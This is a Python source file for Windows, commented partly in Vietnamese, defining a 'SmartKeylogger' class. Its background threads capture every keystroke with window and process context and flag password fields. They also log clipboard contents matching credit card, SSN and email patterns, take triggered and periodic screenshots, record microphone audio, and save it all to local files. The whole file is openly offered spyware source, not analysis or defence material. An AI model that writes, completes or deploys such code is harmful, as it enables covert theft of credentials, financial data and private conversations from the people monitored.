import os
import time
import json
import re
import threading
import win32clipboard
import win32gui
import win32process
import win32api
import win32con
import pyautogui
import pyperclip
import sounddevice as sd
import wave
import numpy as np
from typing import Dict, List, Set, Optional, Any
from datetime import datetime
from pynput import keyboard, mouse
from dataclasses import dataclass, field
from pathlib import Path

@dataclass
class KeyStroke:
    """Thông tin về một keystroke"""
    key: str
    timestamp: float
    window_title: str
    process_name: str
    is_password: bool = False
    context: str = ''

@dataclass 
class FormInput:
    """Thông tin về form input được phát hiện"""
    field_type: str  # password, text, email, etc
    field_name: str
    value: str
    url: str
    timestamp: float

class SmartKeylogger:
    """Keylogger với các tính năng nâng cao"""

    def __init__(self, log_dir: str = "logs"):
        # Initialize logging
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)
        
        # Keystroke logging
        self.keystrokes: List[KeyStroke] = []
        self.form_inputs: List[FormInput] = []
        self.clipboard_data: List[Dict] = []
        
        # Patterns for detection
        self.password_patterns: Set[str] = {
            'password', 'pass', 'pwd', 'secret', 'login', 'auth'
        }
        self.sensitive_patterns: Set[str] = {
            r'\b\d{16}\b',  # Credit card
            r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email
            r'\b\d{3}-\d{2}-\d{4}\b',  # SSN
        }
        
        # Runtime state
        self.running = False
        self.last_window = ''
        self.current_context = ''
        
        # Pattern analysis
        self.pattern_buffer: List[KeyStroke] = []
        self.pattern_interval = 0.5
        
        # Audio recording
        self.audio_chunk = 1024
        self.audio_format = np.int16
        self.channels = 1
        self.rate = 44100
        self.audio_buffer = []
        
        # Screenshots
        self.screenshot_interval = 60  # seconds
        self.screenshot_events = {
            'mouse_click': True,
            'key_combo': True,
            'window_change': True
        }
        
        # Threads
        self.threads = []

    def start(self) -> bool:
        """Start monitoring"""
        if not self.running:
            try:
                self.running = True
                
                # Keyboard monitoring
                keyboard_thread = threading.Thread(target=self._monitor_keyboard)
                keyboard_thread.daemon = True
                keyboard_thread.start()
                self.threads.append(keyboard_thread)
                
                # Mouse monitoring 
                mouse_thread = threading.Thread(target=self._monitor_mouse)
                mouse_thread.daemon = True
                mouse_thread.start()
                self.threads.append(mouse_thread)
                
                # Clipboard monitoring
                clipboard_thread = threading.Thread(target=self._monitor_clipboard)
                clipboard_thread.daemon = True 
                clipboard_thread.start()
                self.threads.append(clipboard_thread)
                
                # Screenshot monitoring
                screenshot_thread = threading.Thread(target=self._screenshot_loop)
                screenshot_thread.daemon = True
                screenshot_thread.start()
                self.threads.append(screenshot_thread)
                
                # Audio monitoring
                audio_thread = threading.Thread(target=self._audio_loop)
                audio_thread.daemon = True
                audio_thread.start()
                self.threads.append(audio_thread)
                
                return True
                
            except Exception as e:
                print(f"Error starting monitor: {str(e)}")
                self.running = False
                return False
                
        return False

    def stop(self) -> bool:
        """Stop monitoring"""
        if self.running:
            try:
                self.running = False
                for thread in self.threads:
                    thread.join()
                self.threads.clear()
                return True
            except Exception as e:
                print(f"Error stopping monitor: {str(e)}")
                return False
        return False

    def _get_window_info(self) -> tuple:
        """Get thông tin về window hiện tại"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | 
                                        win32con.PROCESS_VM_READ, False, pid)
            process_name = win32process.GetModuleFileNameEx(process, 0)
            window_title = win32gui.GetWindowText(hwnd)
            process.close()
            return process_name, window_title
        except Exception:
            return "Unknown", "Unknown"

    def _is_password_field(self, context: str) -> bool:
        """Check if current context là password field"""
        return any(p.lower() in context.lower() for p in self.password_patterns)

    def _monitor_keyboard(self):
        """Monitor keyboard events"""
        def on_press(key):
            if not self.running:
                return False
                
            try:
                process_name, window_title = self._get_window_info()
                
                # Update context nếu window thay đổi
                if window_title != self.last_window:
                    self.current_context = window_title
                    self.last_window = window_title
                    
                    if self.screenshot_events['window_change']:
                        self._take_screenshot('window_change')
                
                # Create keystroke
                k = KeyStroke(
                    key=str(key),
                    timestamp=time.time(),
                    window_title=window_title,
                    process_name=process_name,
                    is_password=self._is_password_field(self.current_context),
                    context=self.current_context
                )
                
                self.keystrokes.append(k)
                self.pattern_buffer.append(k)
                
                # Check for interesting key combinations
                if self._check_interesting_combo(key):
                    self._take_screenshot('key_combo')
                
                # Analyze pattern buffer
                self._analyze_patterns()
                
            except Exception:
                pass
                
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    def _monitor_mouse(self):
        """Monitor mouse events để detect form inputs"""
        def on_click(x, y, button, pressed):
            if not self.running:
                return False
                
            try:
                if pressed:
                    process_name, window_title = self._get_window_info()
                    
                    # Check if clicked element là form input
                    element_info = self._get_element_info(x, y)
                    if element_info and element_info.get('tag') == 'input':
                        input_type = element_info.get('type', 'text')
                        name = element_info.get('name', '')
                        url = self._get_url_from_title(window_title)
                        
                        # Monitor value changes
                        if input_type == 'password':
                            self.current_context = f'password_{name}'
                        else:
                            self.current_context = f'{input_type}_{name}'
                            
                        self.form_inputs.append(FormInput(
                            field_type=input_type,
                            field_name=name,
                            value='',
                            url=url,
                            timestamp=time.time()
                        ))
                        
                    if self.screenshot_events['mouse_click']:
                        self._take_screenshot('mouse_click')
                        
            except Exception:
                pass
                
        with mouse.Listener(on_click=on_click) as listener:
            listener.join()

    def _monitor_clipboard(self):
        """Monitor clipboard changes"""
        last_content = ''
        
        while self.running:
            try:
                current = pyperclip.paste()
                if current != last_content and current:
                    # Check for sensitive data
                    is_sensitive = False
                    matched_pattern = None
                    
                    for pattern in self.sensitive_patterns:
                        if re.search(pattern, current, re.IGNORECASE):
                            is_sensitive = True
                            matched_pattern = pattern
                            break
                            
                    self.clipboard_data.append({
                        'content': current,
                        'timestamp': time.time(),
                        'is_sensitive': is_sensitive,
                        'pattern': matched_pattern,
                        'window': self._get_window_info()[1]
                    })
                    
                    last_content = current
                    
            except Exception:
                pass
                
            time.sleep(0.1)

    def _screenshot_loop(self) -> None:
        """Periodic screenshot capture"""
        while self.running:
            try:
                self._take_screenshot('interval')
                time.sleep(self.screenshot_interval)
            except:
                time.sleep(self.screenshot_interval)

    def _take_screenshot(self, trigger: str) -> None:
        """Capture and save screenshot"""
        try:
            timestamp = datetime.now()
            filename = self.log_dir / f"screenshot_{timestamp:%Y%m%d_%H%M%S}_{trigger}.png"
            
            # Capture screen
            screenshot = pyautogui.screenshot()
            screenshot.save(filename)
            
        except Exception as e:
            print(f"Error capturing screenshot: {str(e)}")

    def _audio_loop(self) -> None:
        """Record audio when significant sound is detected"""
        try:
            def audio_callback(indata, frames, time, status):
                if status:
                    return
                volume_norm = np.linalg.norm(indata) * 10
                if volume_norm > 0.5:  # Adjust threshold
                    self.audio_buffer.extend(indata)
                    
            with sd.InputStream(callback=audio_callback,
                            channels=self.channels,
                            samplerate=self.rate):
                while self.running:
                    time.sleep(0.1)
                    if len(self.audio_buffer) > self.rate * 5:  # 5 seconds
                        self._save_audio()
                        
        except Exception as e:
            print(f"Error in audio recording: {str(e)}")

    def _save_audio(self) -> None:
        """Save recorded audio buffer"""
        if not self.audio_buffer:
            return
            
        try:
            timestamp = datetime.now()
            filename = self.log_dir / f"audio_{timestamp:%Y%m%d_%H%M%S}.wav"
            
            with wave.open(str(filename), 'wb') as wf:
                wf.setnchannels(self.channels)
                wf.setsampwidth(2)  # 16-bit
                wf.setframerate(self.rate)
                wf.writeframes(np.array(self.audio_buffer).tobytes())
                
            self.audio_buffer.clear()
            
        except Exception as e:
            print(f"Error saving audio: {str(e)}")

    def _analyze_patterns(self):
        """Analyze keystroke patterns"""
        if not self.pattern_buffer:
            return
            
        # Check time window
        now = time.time()
        while self.pattern_buffer and \
              now - self.pattern_buffer[0].timestamp > self.pattern_interval:
            self.pattern_buffer.pop(0)
            
        if len(self.pattern_buffer) < 2:
            return
            
        # Calculate timing patterns
        intervals = []
        for i in range(1, len(self.pattern_buffer)):
            interval = self.pattern_buffer[i].timestamp - \
                      self.pattern_buffer[i-1].timestamp
            intervals.append(interval)
            
        # Detect patterns
        repeated = self._detect_repeated_keys()
        consistent_timing = self._check_timing_consistency(intervals)
        
        if repeated or consistent_timing:
            pattern = {
                'timestamp': time.time(),
                'window': self.last_window,
                'repeated_keys': repeated,
                'consistent_timing': consistent_timing,
                'avg_interval': sum(intervals) / len(intervals)
            }

    def _detect_repeated_keys(self) -> Optional[Dict]:
        """Detect repeated key patterns"""
        if len(self.pattern_buffer) < 3:
            return None
            
        # Convert to key sequence
        keys = [k.key for k in self.pattern_buffer]
        
        # Check for repeating subsequences
        for length in range(2, len(keys)//2 + 1):
            for i in range(len(keys) - 2*length + 1):
                if keys[i:i+length] == keys[i+length:i+2*length]:
                    return {
                        'sequence': keys[i:i+length],
                        'position': i,
                        'length': length
                    }
                    
        return None

    def _check_timing_consistency(self, intervals: List[float]) -> bool:
        """Check for consistent typing patterns"""
        if len(intervals) < 3:
            return False
            
        # Calculate standard deviation
        mean = sum(intervals) / len(intervals)
        variance = sum((x - mean) ** 2 for x in intervals) / len(intervals)
        std_dev = variance ** 0.5
        
        # Check if timing is consistent (low standard deviation)
        return std_dev < 0.1 * mean

    def _check_interesting_combo(self, key: keyboard.Key | keyboard.KeyCode) -> bool:
        """Check for interesting key combinations"""
        key_str = str(key)
        interesting_combos = {
            ('Key.ctrl_l', 'c'),  # Copy
            ('Key.ctrl_l', 'v'),  # Paste
            ('Key.alt_l', 'Key.tab'),  # Window switch
            ('Key.ctrl_l', 'Key.alt_l', 'Key.delete')  # System
        }
        
        # Check last 3 keystrokes
        recent_keys = [k.key for k in self.pattern_buffer[-3:]]
        return any(all(k in recent_keys for k in combo) for combo in interesting_combos)

    def _get_element_info(self, x: int, y: int) -> Optional[Dict]:
        """Get thông tin về element tại vị trí x,y"""
        # TODO: Implement using UI Automation
        return None

    def _get_url_from_title(self, title: str) -> str:
        """Extract URL từ window title"""
        # Common browser title patterns
        patterns = [
            r'https?://[^\s]+',
            r'(?:[\w-]+\.)+[\w-]+(?:/[^\s]*)?'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, title)
            if match:
                return match.group(0)
                
        return ''

    def get_collected_data(self) -> Dict:
        """Return collected data"""
        return {
            'keystrokes': [vars(k) for k in self.keystrokes],
            'form_inputs': [vars(f) for f in self.form_inputs], 
            'clipboard': self.clipboard_data
        }

    def save_data(self, output_file: str):
        """Save collected data to file"""
        data = self.get_collected_data()
        try:
            with open(output_file, 'w') as f:
                json.dump(data, f, indent=2, default=str)
        except Exception:
            pass